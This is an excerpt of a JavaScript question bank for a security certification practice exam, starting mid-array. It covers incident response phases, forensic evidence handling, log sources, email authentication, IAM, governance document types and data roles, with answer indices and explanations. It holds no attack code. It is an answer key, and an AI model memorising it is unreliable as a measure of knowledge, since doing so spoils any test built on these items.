  { id:"D4-116", domain:4, obj:"4.8", diff:"medium", q:"What does root cause analysis aim to determine after an incident?", options:["How much ransom to pay","The market value of the data","Which user to fire","The underlying reason the incident occurred so it can be prevented"], answer:3, explain:"<strong>The underlying reason the incident occurred so it can be prevented</strong> is correct because root cause analysis identifies the fundamental cause to drive corrective actions that prevent recurrence.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Which user to fire</b>: root cause analysis seeks systemic causes, not individuals to punish.</span><span class='qd'><b>How much ransom to pay</b>: determining a ransom amount is unrelated to understanding why the incident happened.</span><span class='qd'><b>The market value of the data</b>: valuing data is a business or impact assessment task, not the purpose of root cause analysis.</span>" },
  { id:"D4-117", domain:4, obj:"4.8", diff:"medium", q:"Threat hunting is BEST described as which of the following?", options:["Proactively searching for undetected threats using hypotheses and data","Patching systems on a schedule","Restoring backups after an outage","Waiting for automated alerts to fire"], answer:0, explain:"<strong>Proactively searching for undetected threats using hypotheses and data</strong> is correct because threat hunting iteratively searches telemetry for adversary activity that existing detections may have missed.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Waiting for automated alerts to fire</b>: passively waiting for alerts is reactive monitoring, the opposite of proactive hunting.</span><span class='qd'><b>Patching systems on a schedule</b>: scheduled patching is vulnerability management, not searching for active threats.</span><span class='qd'><b>Restoring backups after an outage</b>: restoring backups is a recovery activity unrelated to proactively seeking hidden adversaries.</span>" },
  { id:"D4-118", domain:4, obj:"4.8", diff:"hard", q:"During evidence collection, an investigator documents every person who handled a disk image and when. Which concept does this maintain?", options:["Legal hold","Chain of custody","Data minimization","Non-repudiation key escrow"], answer:1, explain:"<strong>Chain of custody</strong> is correct because documenting every person who handled the evidence and when preserves its integrity and admissibility.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Legal hold</b>: a legal hold preserves data from deletion but does not track who physically handled an item of evidence.</span><span class='qd'><b>Data minimization</b>: data minimization is a privacy principle of collecting only necessary data, unrelated to evidence handling records.</span><span class='qd'><b>Non-repudiation key escrow</b>: key escrow stores cryptographic keys for recovery and has nothing to do with documenting evidence custody.</span>" },
  { id:"D4-119", domain:4, obj:"4.8", diff:"medium", q:"What is the purpose of a legal hold during or after an incident?", options:["To rotate all encryption keys","To immediately wipe affected drives","To preserve potentially relevant data from deletion or alteration","To publicly disclose the breach"], answer:2, explain:"<strong>To preserve potentially relevant data from deletion or alteration</strong> is correct because a legal hold suspends normal data destruction so information relevant to litigation or investigation is retained.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To immediately wipe affected drives</b>: wiping drives would destroy the very evidence a legal hold is meant to preserve.</span><span class='qd'><b>To publicly disclose the breach</b>: public disclosure is a separate notification obligation, not the function of a legal hold.</span><span class='qd'><b>To rotate all encryption keys</b>: key rotation is a cryptographic hygiene task unrelated to preserving relevant data for legal purposes.</span>" },
  { id:"D4-120", domain:4, obj:"4.8", diff:"hard", q:"When acquiring digital evidence, which practice BEST preserves the integrity of the original media?", options:["Reboot the system repeatedly","Delete temporary files first","Analyze the live original drive directly","Create a forensic image and compute hash values, then work from the copy"], answer:3, explain:"<strong>Create a forensic image and compute hash values, then work from the copy</strong> is correct because imaging and hashing let analysis proceed on a verified copy while proving the original was unaltered.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Analyze the live original drive directly</b>: working on the original risks modifying it and compromising evidentiary integrity.</span><span class='qd'><b>Reboot the system repeatedly</b>: rebooting alters and destroys volatile data and system state, harming the investigation.</span><span class='qd'><b>Delete temporary files first</b>: deleting any files changes the original media and destroys potential evidence.</span>" },
  { id:"D4-121", domain:4, obj:"4.8", diff:"medium", q:"In which IR phase does an organization remove malware, disable breached accounts, and close the exploited vulnerability?", options:["Eradication","Recovery","Preparation","Containment"], answer:0, explain:"<strong>Eradication</strong> is correct because this phase removes malware, disables breached accounts, and closes the exploited vulnerability before systems are recovered.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Containment</b>: containment limits the threat's spread but does not yet remove malware or fix the underlying weakness.</span><span class='qd'><b>Recovery</b>: recovery restores and validates systems after the threat has already been eradicated.</span><span class='qd'><b>Preparation</b>: preparation builds plans and tools before any incident and does not remove an active threat.</span>" },
  { id:"D4-122", domain:4, obj:"4.8", diff:"easy", q:"During which phase do analysts confirm that an alert is a genuine incident and assess its scope?", options:["Preparation","Detection and analysis","Recovery","Lessons learned"], answer:1, explain:"<strong>Detection and analysis</strong> is correct because this phase validates alerts, determines whether a real incident occurred, and characterizes its scope and severity.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Preparation</b>: preparation readies the team before an incident and does not analyze a specific alert.</span><span class='qd'><b>Recovery</b>: recovery restores systems after the threat is removed, well after the analysis of an alert.</span><span class='qd'><b>Lessons learned</b>: lessons learned is the post-incident retrospective, not the confirmation of an active alert.</span>" },
  { id:"D4-123", domain:4, obj:"4.8", diff:"hard", q:"A responder must choose between immediately wiping a compromised server and capturing volatile memory first. For a thorough investigation, what should be done FIRST?", options:["Run a full disk defragmentation","Wipe and reimage immediately","Capture volatile data such as RAM before powering down","Disconnect power without capture"], answer:2, explain:"<strong>Capture volatile data such as RAM before powering down</strong> is correct because the order of volatility dictates acquiring fleeting artifacts like memory before they are lost at shutdown.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Wipe and reimage immediately</b>: wiping destroys all evidence, including volatile data, defeating a thorough investigation.</span><span class='qd'><b>Disconnect power without capture</b>: cutting power erases RAM and other volatile artifacts before they can be collected.</span><span class='qd'><b>Run a full disk defragmentation</b>: defragmentation rewrites the disk and alters evidence while doing nothing to preserve volatile memory.</span>" },
  { id:"D4-124", domain:4, obj:"4.8", diff:"medium", q:"Why is having a tested communication plan part of IR preparation?", options:["To replace technical controls","To shorten password length","To reduce server costs","To ensure stakeholders, legal, and regulators are notified appropriately during an incident"], answer:3, explain:"<strong>To ensure stakeholders, legal, and regulators are notified appropriately during an incident</strong> is correct because a tested communication plan defines who must be informed and how, enabling timely and compliant notifications.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To reduce server costs</b>: a communication plan concerns notifications, not infrastructure spending.</span><span class='qd'><b>To replace technical controls</b>: communication coordinates people and does not substitute for firewalls, EDR, or other technical defenses.</span><span class='qd'><b>To shorten password length</b>: password policy is unrelated to incident notification planning.</span>" },
  { id:"D4-125", domain:4, obj:"4.8", diff:"hard", q:"After containment of a breached web app, the same exploit recurs days later on a rebuilt server. What was MOST likely skipped or done poorly?", options:["Eradication of the underlying vulnerability","Preparation training","Communication plan","Lessons learned"], answer:0, explain:"<strong>Eradication of the underlying vulnerability</strong> is correct because if the exploited weakness was not fully removed, rebuilt systems remain open to the same attack.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Lessons learned</b>: skipping the retrospective review would not directly cause the same exploit to succeed again on a rebuilt server.</span><span class='qd'><b>Preparation training</b>: insufficient training is a readiness gap and does not by itself leave the specific vulnerability open to reexploitation.</span><span class='qd'><b>Communication plan</b>: a poor communication plan affects notifications, not whether the technical vulnerability was actually closed.</span>" },
  { id:"D4-126", domain:4, obj:"4.8", diff:"medium", q:"Which document defines roles, escalation paths, and procedures used when an incident occurs?", options:["Data retention schedule","Incident response plan","Acceptable use policy","Service level agreement"], answer:1, explain:"<strong>Incident response plan</strong> is correct because it specifies roles, responsibilities, escalation paths, and step-by-step procedures for handling incidents.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Acceptable use policy</b>: an AUP defines permitted user behavior on systems, not how to respond to an incident.</span><span class='qd'><b>Service level agreement</b>: an SLA sets performance and availability commitments with a provider, not internal incident procedures.</span><span class='qd'><b>Data retention schedule</b>: a retention schedule governs how long data is kept, not incident escalation and response steps.</span>" },
  { id:"D4-127", domain:4, obj:"4.8", diff:"hard", q:"An IR team wants to validate that its plan works end to end, including failover, under realistic conditions. Which exercise type goes beyond a tabletop to BEST achieve this?", options:["Asset inventory","Walkthrough review","Simulation/functional exercise","Policy sign-off"], answer:2, explain:"<strong>Simulation/functional exercise</strong> is correct because it actively executes response procedures and technical actions, including failover, testing the plan more rigorously than a discussion-only tabletop.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Walkthrough review</b>: a walkthrough is a discussion-based review that does not execute technical actions or failover end to end.</span><span class='qd'><b>Policy sign-off</b>: signing off on a policy is an administrative approval, not an operational test of the plan.</span><span class='qd'><b>Asset inventory</b>: an asset inventory catalogs systems and does not validate that the response plan works under realistic conditions.</span>" },
  { id:"D4-128", domain:4, obj:"4.9", diff:"easy", q:"Which data source aggregates and correlates logs from many systems to support investigation and alerting?", options:["DHCP","NTP","DNS","SIEM"], answer:3, explain:"<strong>SIEM</strong> is correct because it centralizes log collection, correlation, and alerting from many systems to support investigation.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>DHCP</b>: DHCP assigns IP addresses to hosts and provides only its own lease logs, not aggregated correlation across systems.</span><span class='qd'><b>NTP</b>: NTP synchronizes clocks, which aids log correlation but does not itself aggregate or correlate logs.</span><span class='qd'><b>DNS</b>: DNS resolves names to addresses and is a single data source, not a correlation platform.</span>" },
  { id:"D4-129", domain:4, obj:"4.9", diff:"medium", q:"An investigator needs to examine the exact bytes and protocol exchange of suspicious network traffic. Which data source is MOST appropriate?", options:["Full packet capture","Asset inventory","Patch log","Vulnerability scan report"], answer:0, explain:"<strong>Full packet capture</strong> is correct because it preserves complete payloads and headers, enabling deep protocol-level forensic analysis of the exact bytes exchanged.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Vulnerability scan report</b>: a scan report lists weaknesses and missing patches but contains no actual traffic to examine.</span><span class='qd'><b>Asset inventory</b>: an inventory catalogs devices and does not record network traffic content.</span><span class='qd'><b>Patch log</b>: a patch log records applied updates and reveals nothing about the bytes of suspicious traffic.</span>" },
  { id:"D4-130", domain:4, obj:"4.9", diff:"medium", q:"Which data source identifies missing patches and known weaknesses across hosts?", options:["DNS zone file","Vulnerability scan output","Packet capture","Badge access log"], answer:1, explain:"<strong>Vulnerability scan output</strong> is correct because it enumerates missing patches, misconfigurations, and known CVEs across hosts to prioritize remediation.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Packet capture</b>: a packet capture records traffic content and does not enumerate missing patches across hosts.</span><span class='qd'><b>Badge access log</b>: a badge log records physical entry events, unrelated to host software weaknesses.</span><span class='qd'><b>DNS zone file</b>: a zone file lists DNS records for a domain and reveals nothing about host patch status.</span>" },
  { id:"D4-131", domain:4, obj:"4.9", diff:"easy", q:"What is the main value of a security dashboard?", options:["It provisions user accounts","It replaces all log storage","It visualizes key metrics and alerts for at-a-glance situational awareness","It encrypts network traffic"], answer:2, explain:"<strong>It visualizes key metrics and alerts for at-a-glance situational awareness</strong> is correct because dashboards present consolidated metrics, trends, and alerts so analysts can quickly assess posture.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It replaces all log storage</b>: a dashboard visualizes data but does not store the underlying logs, which still require retention elsewhere.</span><span class='qd'><b>It encrypts network traffic</b>: encryption is a transport security function, not a dashboard capability.</span><span class='qd'><b>It provisions user accounts</b>: account provisioning is an IAM task unrelated to visualizing security metrics.</span>" },
  { id:"D4-132", domain:4, obj:"4.9", diff:"hard", q:"An analyst correlating a suspected intrusion needs to know which internal IP held a DHCP lease at the time and which user authenticated. Which combination of sources BEST answers this?", options:["Only a network diagram","Only a firewall product brochure","Only vulnerability scans","DHCP logs plus authentication/security logs"], answer:3, explain:"<strong>DHCP logs plus authentication/security logs</strong> is correct because DHCP leases map an IP to a host over time while authentication logs tie the session to a user, together attributing the activity.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Only vulnerability scans</b>: scans list weaknesses and cannot show which IP a host held or which user logged in at a given time.</span><span class='qd'><b>Only a network diagram</b>: a diagram depicts topology but contains no time-specific lease or authentication data.</span><span class='qd'><b>Only a firewall product brochure</b>: a marketing brochure provides no investigative log data whatsoever.</span>" },
  { id:"D4-133", domain:4, obj:"4.5", diff:"medium", q:"Which capability is specifically designed to detect and respond to threats on individual endpoints, including isolation and rollback?", options:["EDR","Network TAP","SPF","NAT"], answer:0, explain:"<strong>EDR</strong> is correct because Endpoint Detection and Response provides endpoint-level detection, investigation, isolation, and remediation including rollback.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Network TAP</b>: a TAP passively copies network traffic for monitoring and cannot detect or respond on an individual endpoint.</span><span class='qd'><b>SPF</b>: SPF authorizes mail-sending servers for a domain and has no endpoint detection function.</span><span class='qd'><b>NAT</b>: NAT translates network addresses and provides no threat detection or endpoint response.</span>" },
  { id:"D4-134", domain:4, obj:"4.5", diff:"hard", q:"A phishing email passed SPF because it was sent from a compromised but authorized server, yet DMARC still failed. Which condition MOST likely caused the DMARC failure?", options:["DMARC ignores SPF entirely","Identifier alignment failed between the From domain and the authenticated domain","DKIM is not allowed with DMARC","DMARC only checks the envelope sender"], answer:1, explain:"<strong>Identifier alignment failed between the From domain and the authenticated domain</strong> is correct because DMARC requires alignment between the visible From domain and the SPF or DKIM authenticated domain, so misalignment fails even when SPF passes.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>DMARC ignores SPF entirely</b>: DMARC actually evaluates SPF results together with alignment, so it does not ignore SPF.</span><span class='qd'><b>DKIM is not allowed with DMARC</b>: DKIM is one of the two mechanisms DMARC explicitly relies on, so this is false.</span><span class='qd'><b>DMARC only checks the envelope sender</b>: DMARC focuses on the visible header From domain and its alignment, not solely the envelope sender.</span>" },
  { id:"D4-135", domain:4, obj:"4.6", diff:"hard", q:"A breakglass administrator account is rarely used but powerful. Which control BEST limits its abuse while keeping it available for emergencies?", options:["Use a static, never-rotated password","Disable MFA to speed access","Vault the credential in PAM with monitored, audited checkout","Share it widely so anyone can use it"], answer:2, explain:"<strong>Vault the credential in PAM with monitored, audited checkout</strong> is correct because storing the breakglass account in a PAM vault with audited, monitored, rotating checkout controls its use without losing emergency availability.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Disable MFA to speed access</b>: removing MFA weakens protection of a powerful account, increasing abuse risk rather than limiting it.</span><span class='qd'><b>Share it widely so anyone can use it</b>: broad sharing destroys accountability and makes abuse far more likely.</span><span class='qd'><b>Use a static, never-rotated password</b>: a never-rotated password stays valid indefinitely if exposed, the opposite of limiting abuse.</span>" },
  { id:"D4-136", domain:4, obj:"4.6", diff:"medium", q:"Which statement BEST describes the relationship between authentication and authorization in IAM?", options:["Authorization always precedes authentication","Authentication grants resource access directly","They are the same process","Authentication proves identity; authorization determines permitted actions"], answer:3, explain:"<strong>Authentication proves identity; authorization determines permitted actions</strong> is correct because authentication verifies who a user is while authorization decides what that verified user may do.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>They are the same process</b>: authentication and authorization are distinct steps and are not interchangeable.</span><span class='qd'><b>Authorization always precedes authentication</b>: identity must be proven first, so authentication precedes authorization, not the reverse.</span><span class='qd'><b>Authentication grants resource access directly</b>: authentication only confirms identity; granting access is the separate authorization step.</span>" },
  { id:"D4-137", domain:4, obj:"4.8", diff:"medium", q:"Why should responders avoid alerting attackers prematurely during the analysis phase of an active intrusion?", options:["Tipping off attackers may cause them to destroy evidence or accelerate damage","It increases server costs","It is required by SPF","It violates licensing terms"], answer:0, explain:"<strong>Tipping off attackers may cause them to destroy evidence or accelerate damage</strong> is correct because premature disclosure can prompt adversaries to wipe logs, deploy destructive payloads, or change tactics.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It violates licensing terms</b>: alerting attackers has nothing to do with software licensing.</span><span class='qd'><b>It increases server costs</b>: cost is irrelevant to the operational security risk of tipping off an adversary.</span><span class='qd'><b>It is required by SPF</b>: SPF is an email authentication mechanism and imposes no rule about disclosing investigations.</span>" },
  { id:"D4-138", domain:4, obj:"4.5", diff:"medium", q:"Which firewall concept tracks the state of active connections so that return traffic for an allowed session is permitted automatically?", options:["Stateless filtering","Stateful inspection","Proxy caching","MAC filtering"], answer:1, explain:"<strong>Stateful inspection</strong> is correct because it maintains a connection table so legitimate return traffic for established sessions is permitted automatically.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Stateless filtering</b>: stateless filtering evaluates each packet in isolation and cannot automatically allow return traffic without explicit rules.</span><span class='qd'><b>Proxy caching</b>: proxy caching stores content to speed repeat requests and does not track connection state.</span><span class='qd'><b>MAC filtering</b>: MAC filtering permits or denies devices by hardware address and has no concept of connection sessions.</span>" },
  { id:"D4-139", domain:4, obj:"4.9", diff:"hard", q:"An organization keeps logs on the source hosts only. Why is centralized log aggregation MORE reliable for investigations?", options:["It encrypts the endpoints","It uses less storage","Attackers who compromise a host can tamper with or delete local logs, but forwarded copies remain","It eliminates the need for time synchronization"], answer:2, explain:"<strong>Attackers who compromise a host can tamper with or delete local logs, but forwarded copies remain</strong> is correct because forwarding logs to a central, protected store preserves evidence even when local logs are altered.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It uses less storage</b>: centralization typically consolidates rather than reduces storage and is not the reliability reason.</span><span class='qd'><b>It eliminates the need for time synchronization</b>: accurate correlation still requires synchronized clocks, so centralization does not remove that need.</span><span class='qd'><b>It encrypts the endpoints</b>: forwarding logs does not encrypt the endpoints and is unrelated to endpoint encryption.</span>" },
  { id:"D4-140", domain:4, obj:"4.6", diff:"hard", q:"A SaaS provider lets enterprise customers authenticate their own employees via the customer's identity provider. Which arrangement BEST describes this?", options:["Shared root credentials","Static API keys per user","Local account replication","Federated identity with SAML or OIDC"], answer:3, explain:"<strong>Federated identity with SAML or OIDC</strong> is correct because federation lets the SaaS service provider trust the customer's identity provider so employees authenticate with their own corporate identities.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Local account replication</b>: replicating local accounts duplicates identities instead of trusting the customer's identity provider, which is not federation.</span><span class='qd'><b>Shared root credentials</b>: sharing a single root credential destroys accountability and is not how enterprises federate employee logins.</span><span class='qd'><b>Static API keys per user</b>: per-user API keys authenticate applications or scripts, not the federated single sign-on the scenario describes.</span>" }
);
SECPLUS.questions.push(
{ id:"D5-001", domain:5, obj:"5.1", diff:"easy", q:"Which type of governance document is a high-level statement of management intent that is mandatory but does not contain step-by-step instructions?", options:["Policy","Procedure","Guideline","Playbook"], answer:0, explain:"A <strong>policy</strong> is a high-level, mandatory statement of management intent and direction that does not spell out step-by-step instructions.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Procedure</b>: a procedure provides the detailed, ordered steps to carry out a task, which is exactly the step-by-step content a policy omits.</span><span class='qd'><b>Guideline</b>: a guideline is advisory and optional, not a mandatory statement of management intent.</span><span class='qd'><b>Playbook</b>: a playbook is an operational, scenario-specific set of response steps, not a high-level governance directive.</span>" },
{ id:"D5-002", domain:5, obj:"5.1", diff:"easy", q:"A document that specifies the exact, required technical parameters such as 'all passwords must be at least 14 characters' is best classified as a:", options:["Guideline","Standard","Policy","Framework"], answer:1, explain:"A <strong>standard</strong> defines specific, mandatory technical requirements such as a minimum password length that enforce a broader policy.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Guideline</b>: a guideline only recommends practices and is non-binding, so it cannot impose a required 14-character minimum.</span><span class='qd'><b>Policy</b>: a policy states high-level intent and direction, not the precise technical parameter values that a standard specifies.</span><span class='qd'><b>Framework</b>: a framework is a structured reference model of control categories, not a single mandatory parameter for an organization.</span>" },
{ id:"D5-003", domain:5, obj:"5.1", diff:"easy", q:"Which document type provides recommended, non-mandatory advice that helps users comply with policies and standards?", options:["Procedure","Standard","Guideline","Regulation"], answer:2, explain:"A <strong>guideline</strong> offers recommended, non-mandatory advice that helps people comply with policies and standards.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Procedure</b>: a procedure is a mandatory set of exact steps for a task, not optional advice.</span><span class='qd'><b>Standard</b>: a standard imposes mandatory requirements, the opposite of non-binding recommendations.</span><span class='qd'><b>Regulation</b>: a regulation is a legally enforceable external mandate, not internal advisory guidance.</span>" },
{ id:"D5-004", domain:5, obj:"5.1", diff:"easy", q:"An Acceptable Use Policy (AUP) primarily defines:", options:["The recovery time objective for critical systems","The financial value of an asset for risk calculations","The encryption algorithms approved for data at rest","How employees may and may not use organizational systems and resources"], answer:3, explain:"An <strong>Acceptable Use Policy</strong> defines how employees may and may not use organizational systems and resources, including prohibited behavior.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>The encryption algorithms approved for data at rest</b>: that belongs in a cryptographic standard, not an AUP, which governs user conduct rather than technical settings.</span><span class='qd'><b>The recovery time objective for critical systems</b>: an RTO is a business continuity metric set by a BIA, unrelated to acceptable use rules.</span><span class='qd'><b>The financial value of an asset for risk calculations</b>: asset valuation is part of risk analysis, not a statement of permitted system usage.</span>" },
{ id:"D5-005", domain:5, obj:"5.1", diff:"medium", q:"Under common data governance roles, which party determines the purposes and means of processing personal data and bears ultimate accountability for it?", options:["Data controller","Data steward","Data processor","Data custodian"], answer:0, explain:"The <strong>data controller</strong> determines the purposes and means of processing personal data and holds ultimate accountability for it.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Data processor</b>: a processor only acts on the controller's instructions and does not decide the purposes of processing.</span><span class='qd'><b>Data custodian</b>: a custodian handles day-to-day technical protection of data, not the decision of why or how it is processed.</span><span class='qd'><b>Data steward</b>: a steward focuses on data quality and proper business use, not on determining processing purposes or bearing legal accountability.</span>" },
{ id:"D5-006", domain:5, obj:"5.1", diff:"medium", q:"A third-party payroll company that handles employee data strictly according to the client's instructions is acting as the:", options:["Data controller","Data processor","Data owner","Data steward"], answer:1, explain:"A <strong>data processor</strong> performs operations on personal data on behalf of and strictly per the instructions of the controller.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Data controller</b>: the controller sets the purposes and means of processing, whereas the payroll firm merely follows the client's instructions.</span><span class='qd'><b>Data owner</b>: the data owner is a senior accountable individual within the organization that owns the data, not an external service acting on instructions.</span><span class='qd'><b>Data steward</b>: a steward manages data quality and definitions internally, not external processing performed under contract.</span>" },
{ id:"D5-007", domain:5, obj:"5.1", diff:"medium", q:"Which role is typically a senior business leader who is ultimately responsible for a specific data set and decides its classification and acceptable use?", options:["Data subject","Data custodian","Data owner","Data processor"], answer:2, explain:"The <strong>data owner</strong> is a senior business leader ultimately responsible for a data set who sets its classification and authorizes acceptable use.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Data custodian</b>: a custodian implements the owner's decisions technically and does not set classification or accountability.</span><span class='qd'><b>Data processor</b>: a processor handles data on a controller's instructions and is not the accountable senior owner of the data set.</span><span class='qd'><b>Data subject</b>: a data subject is the person the data is about, not a role that classifies or governs the data.</span>" },
{ id:"D5-008", domain:5, obj:"5.1", diff:"medium", q:"A systems administrator who applies the access controls, backups, and encryption settings dictated by the data owner is functioning as the data:", options:["Subject","Steward","Controller","Custodian"], answer:3, explain:"The <strong>custodian</strong> performs the day-to-day technical protection of data, applying access controls, backups, and encryption as directed by the data owner.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Steward</b>: a steward concentrates on data quality and proper business use, not on configuring the technical safeguards.</span><span class='qd'><b>Controller</b>: a controller decides the purposes and means of processing, not the hands-on technical implementation.</span><span class='qd'><b>Subject</b>: a data subject is the individual the data describes, with no role in administering protections.</span>" },
{ id:"D5-009", domain:5, obj:"5.1", diff:"hard", q:"An organization wants someone focused on ensuring data quality, consistent definitions, and appropriate business use across departments, without owning the infrastructure. Which role BEST fits?", options:["Data steward","Data processor","Data controller","Data custodian"], answer:0, explain:"The <strong>data steward</strong> focuses on data quality, consistent definitions, and appropriate business use across departments without owning the infrastructure.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Data custodian</b>: a custodian maintains the technical infrastructure and safeguards, which is the very ownership the scenario excludes.</span><span class='qd'><b>Data processor</b>: a processor performs processing operations under a controller's instructions, not internal data-quality governance.</span><span class='qd'><b>Data controller</b>: a controller determines processing purposes and bears legal accountability, a broader decision-making role than stewardship.</span>" },
{ id:"D5-010", domain:5, obj:"5.1", diff:"medium", q:"Which governance structure is characterized by a small group of executives or directors who set overall security strategy and approve major policies?", options:["Regulatory enforcement body","Centralized board or committee","Decentralized team ownership","Outsourced advisory only"], answer:1, explain:"A <strong>centralized board or committee</strong> is a small group of executives or directors that sets enterprise-wide security strategy and approves major policies.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Decentralized team ownership</b>: decentralized governance distributes decision-making to local units rather than concentrating it in one central body.</span><span class='qd'><b>Outsourced advisory only</b>: external advisors may guide but do not hold internal authority to set strategy or approve policy.</span><span class='qd'><b>Regulatory enforcement body</b>: a regulator is an external authority that enforces laws, not an internal governance structure setting company strategy.</span>" },
{ id:"D5-011", domain:5, obj:"5.1", diff:"hard", q:"A multinational firm lets each regional office craft its own security policies tailored to local laws, with light central coordination. This MOST closely describes which governance model?", options:["Procedural governance","Centralized governance","Decentralized governance","Regulatory governance"], answer:2, explain:"<strong>Decentralized governance</strong> pushes decision-making down to local units, letting each region tailor policies to local laws with only light central coordination.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Centralized governance</b>: centralized models concentrate authority in one body for global consistency, the opposite of region-by-region policy creation.</span><span class='qd'><b>Regulatory governance</b>: that is not a standard governance model, and the scenario describes internal structure, not externally imposed regulation.</span><span class='qd'><b>Procedural governance</b>: this is not a recognized governance model; it confuses a document type (procedures) with the distribution of authority.</span>" },
{ id:"D5-012", domain:5, obj:"5.1", diff:"medium", q:"Laws, regulations, and industry frameworks that an organization must account for when shaping its security program are referred to as:", options:["Compensating controls","Residual factors","Internal controls","External considerations"], answer:3, explain:"<strong>External considerations</strong> are the laws, regulations, and industry frameworks outside the organization that shape and constrain its security program.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Internal controls</b>: internal controls are safeguards the organization implements itself, not the external mandates that drive them.</span><span class='qd'><b>Compensating controls</b>: a compensating control is an alternative safeguard used when a primary control is infeasible, not a body of external law.</span><span class='qd'><b>Residual factors</b>: residual risk is what remains after controls are applied, not an external legal or regulatory driver.</span>" },
{ id:"D5-013", domain:5, obj:"5.1", diff:"hard", q:"A company operating in healthcare, finance, and the EU must reconcile HIPAA, PCI DSS, and GDPR. Which external consideration category does this BEST illustrate?", options:["Regulatory and industry compliance drivers","Internal procedural standards","Voluntary guideline adoption","Compensating control selection"], answer:0, explain:"Reconciling HIPAA, PCI DSS, and GDPR illustrates <strong>regulatory and industry compliance drivers</strong>, the external mandates that must be harmonized within a program.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Internal procedural standards</b>: these are documents the organization writes itself, not the external regulatory mandates the firm must satisfy.</span><span class='qd'><b>Voluntary guideline adoption</b>: HIPAA, PCI DSS, and GDPR are mandatory obligations, not optional guidelines.</span><span class='qd'><b>Compensating control selection</b>: choosing an alternative control is a control-design activity, not a category of external compliance obligation.</span>" },
{ id:"D5-014", domain:5, obj:"5.1", diff:"easy", q:"Which document would contain the precise, ordered steps an analyst follows to onboard a new user account?", options:["Standard","Procedure","Guideline","Policy"], answer:1, explain:"A <strong>procedure</strong> documents the precise, ordered steps an analyst follows to perform a repeatable task such as onboarding a new user account.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Policy</b>: a policy states high-level intent and does not contain step-by-step instructions.</span><span class='qd'><b>Standard</b>: a standard sets mandatory parameter values, not the sequence of actions to execute a task.</span><span class='qd'><b>Guideline</b>: a guideline offers optional advice, not the exact required steps for onboarding.</span>" },
{ id:"D5-015", domain:5, obj:"5.1", diff:"medium", q:"During offboarding, which governance document should define the required steps to revoke access, recover assets, and disable accounts?", options:["Acceptable use policy","Onboarding guideline","Offboarding procedure","Risk appetite statement"], answer:2, explain:"An <strong>offboarding procedure</strong> defines the concrete steps to revoke access, recover assets, and disable accounts when an employee departs.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Acceptable use policy</b>: an AUP governs how employees may use systems while employed, not the steps to deprovision a departing one.</span><span class='qd'><b>Onboarding guideline</b>: onboarding addresses bringing a user in, and a guideline is advisory rather than a required step set.</span><span class='qd'><b>Risk appetite statement</b>: a risk appetite statement expresses how much risk leadership will accept, not deprovisioning steps.</span>" },
{ id:"D5-016", domain:5, obj:"5.1", diff:"hard", q:"Leadership wants a single statement that expresses how much risk the enterprise is willing to pursue in order to meet objectives, to guide all downstream policies. This is the organization's:", options:["Risk register","Risk threshold","Risk tolerance","Risk appetite"], answer:3, explain:"<strong>Risk appetite</strong> is the broad amount and type of risk an organization is willing to pursue in order to meet its objectives, guiding downstream policy.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Risk tolerance</b>: tolerance is the acceptable variation around a specific risk objective, narrower than the enterprise-wide appetite.</span><span class='qd'><b>Risk register</b>: a risk register is a tracking repository of identified risks, not a statement of how much risk the enterprise will accept.</span><span class='qd'><b>Risk threshold</b>: a threshold is a specific trigger point for action on an individual risk, not the overarching willingness-to-accept statement.</span>" },
{ id:"D5-017", domain:5, obj:"5.1", diff:"easy", q:"Which of the following is the MOST authoritative and mandatory in a typical document hierarchy?", options:["Policy","Guideline","Procedure","Standard"], answer:0, explain:"A <strong>policy</strong> sits at the top of the document hierarchy as the mandatory management directive that standards and procedures support.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Guideline</b>: guidelines are advisory and non-binding, placing them at the least authoritative level.</span><span class='qd'><b>Procedure</b>: procedures are mandatory but subordinate, implementing the steps required to satisfy policy.</span><span class='qd'><b>Standard</b>: standards are mandatory yet derive their authority from the policy they enforce, so they rank below it.</span>" },
